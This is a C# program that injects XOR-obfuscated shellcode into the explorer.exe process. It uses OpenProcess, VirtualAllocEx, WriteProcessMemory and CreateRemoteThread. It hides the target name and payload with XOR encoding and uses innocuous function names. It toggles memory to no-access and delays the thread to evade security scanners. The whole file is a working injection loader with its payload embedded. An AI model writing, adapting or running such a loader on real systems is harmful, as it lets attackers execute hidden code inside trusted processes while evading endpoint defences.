using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

class Program
{
    // --- WinAPI Imports ---
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll")]
    static extern void Sleep(uint dwMilliseconds);

    // --- Constantes ---
    const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint PAGE_NOACCESS = 0x01;
    const uint CREATE_SUSPENDED = 0x00000004;

    // --- XOR decript function ---
    static void BarberShop(byte[] data, byte key)
    {
        for (int i = 0; i < data.Length; i++)
            data[i] ^= key;
    }

    static void Main()
    {
        // Obfuscated target name: "tia}~ctc?tit" XOR 0x11 => "explorer.exe"
        byte[] obfuscatedName = Encoding.ASCII.GetBytes("tia}~ctc?tit");
        BarberShop(obfuscatedName, 0x11);
        string targetProcessName = Encoding.ASCII.GetString(obfuscatedName);

        // Buscar PID
        Process target = null;
        foreach (var proc in Process.GetProcesses())
        {
            if (proc.ProcessName.Equals(targetProcessName.Replace(".exe", ""), StringComparison.OrdinalIgnoreCase))
            {
                target = proc;
                break;
            }
        }

        if (target == null)
        {
            Console.WriteLine("[-] Ops! PID not found!");
            return;
        }

        Console.WriteLine($"[+] Found process {targetProcessName} with PID {target.Id}");

        // Shellcode XOR
        byte[] mustacheCode = new byte[]
        {
    0x56, 0xe2, 0x2b, 0x4e, 0x5a, 0x55, 0x55, 0x55, 0x42, 0x66, 0xaa, 0xaa, 0xaa, 0xeb, 0xfb, 0xeb,
    0xfa, 0xf8, 0xe2, 0x9b, 0x78, 0xfb, 0xcf, 0xe2, 0x21, 0xf8, 0xca, 0xe2, 0x21, 0xf8, 0xb2, 0xe2,
    0x21, 0xf8, 0x8a, 0xfc, 0xe2, 0xa5, 0x1d, 0xe0, 0xe0, 0xe2, 0x21, 0xd8, 0xfa, 0xe7, 0x9b, 0x63,
    0xe2, 0x9b, 0x6a, 0x06, 0x96, 0xcb, 0xd6, 0xa8, 0x86, 0x8a, 0xeb, 0x6b, 0x63, 0xa7, 0xeb, 0xab,
    0x6b, 0x48, 0x47, 0xf8, 0xe2, 0x21, 0xf8, 0x8a, 0xeb, 0xfb, 0x21, 0xe8, 0x96, 0xe2, 0xab, 0x7a,
    0xcc, 0x2b, 0xd2, 0xb2, 0xa1, 0xa8, 0xa5, 0x2f, 0xd8, 0xaa, 0xaa, 0xaa, 0x21, 0x2a, 0x22, 0xaa,
    0xaa, 0xaa, 0xe2, 0x2f, 0x6a, 0xde, 0xcd, 0xe2, 0xab, 0x7a, 0xee, 0x21, 0xea, 0x8a, 0xe3, 0xab,
    0x7a, 0x21, 0xe2, 0xb2, 0xfa, 0x49, 0xfc, 0xe2, 0x55, 0x63, 0xe7, 0x9b, 0x63, 0xeb, 0x21, 0x9e,
    0x22, 0xe2, 0xab, 0x7c, 0xe2, 0x9b, 0x6a, 0x06, 0xeb, 0x6b, 0x63, 0xa7, 0xeb, 0xab, 0x6b, 0x92,
    0x4a, 0xdf, 0x5b, 0xe6, 0xa9, 0xe6, 0x8e, 0xa2, 0xef, 0x93, 0x7b, 0xdf, 0x72, 0xf2, 0xee, 0x21,
    0xea, 0x8e, 0xe3, 0xab, 0x7a, 0xcc, 0xeb, 0x21, 0xa6, 0xe2, 0xee, 0x21, 0xea, 0xb6, 0xe3, 0xab,
    0x7a, 0xeb, 0x21, 0xae, 0x22, 0xe2, 0xab, 0x7a, 0xeb, 0xf2, 0xeb, 0xf2, 0xf4, 0xf3, 0xf0, 0xeb,
    0xf2, 0xeb, 0xf3, 0xeb, 0xf0, 0xe2, 0x29, 0x46, 0x8a, 0xeb, 0xf8, 0x55, 0x4a, 0xf2, 0xeb, 0xf3,
    0xf0, 0xe2, 0x21, 0xb8, 0x43, 0xe1, 0x55, 0x55, 0x55, 0xf7, 0x42, 0xa1, 0xaa, 0xaa, 0xaa, 0xdf,
    0xd9, 0xcf, 0xd8, 0x99, 0x98, 0x84, 0xce, 0xc6, 0xc6, 0xaa, 0xf3, 0xeb, 0x10, 0xe6, 0xdd, 0x8c,
    0xad, 0x55, 0x7f, 0xe3, 0x6d, 0x6b, 0xaa, 0xaa, 0xaa, 0xaa, 0x42, 0xb8, 0xaa, 0xaa, 0xaa, 0xe7,
    0xc5, 0xc7, 0x8a, 0xe3, 0x8a, 0xcb, 0xc7, 0x8a, 0xcb, 0x8a, 0xe2, 0xcb, 0xc9, 0xc1, 0xcf, 0xd8,
    0xaa, 0xf0, 0x42, 0xb8, 0xaa, 0xaa, 0xaa, 0xe7, 0xc5, 0xc7, 0x8a, 0xe3, 0x8a, 0xcb, 0xc7, 0x8a,
    0xcb, 0x8a, 0xe2, 0xcb, 0xc9, 0xc1, 0xcf, 0xd8, 0xaa, 0xeb, 0xf2, 0xe2, 0x9b, 0x63, 0xeb, 0x10,
    0xef, 0x29, 0xfc, 0xad, 0x55, 0x7f, 0xe2, 0x9b, 0x63, 0xeb, 0x10, 0x5a, 0x1f, 0x08, 0xfc, 0x55,
    0x7f
        };

        BarberShop(mustacheCode, 0xAA);

        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, target.Id);

        IntPtr remoteAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)mustacheCode.Length,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        WriteProcessMemory(hProcess, remoteAddr, mustacheCode, (uint)mustacheCode.Length, out _);

        VirtualProtectEx(hProcess, remoteAddr, (uint)mustacheCode.Length, PAGE_NOACCESS, out uint oldProtect);

        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, CREATE_SUSPENDED, IntPtr.Zero);

        Sleep(20000);

        VirtualProtectEx(hProcess, remoteAddr, (uint)mustacheCode.Length, PAGE_EXECUTE_READWRITE, out _);

        ResumeThread(hThread);

        Console.WriteLine("[+] Shellcode executed!");
    }
}
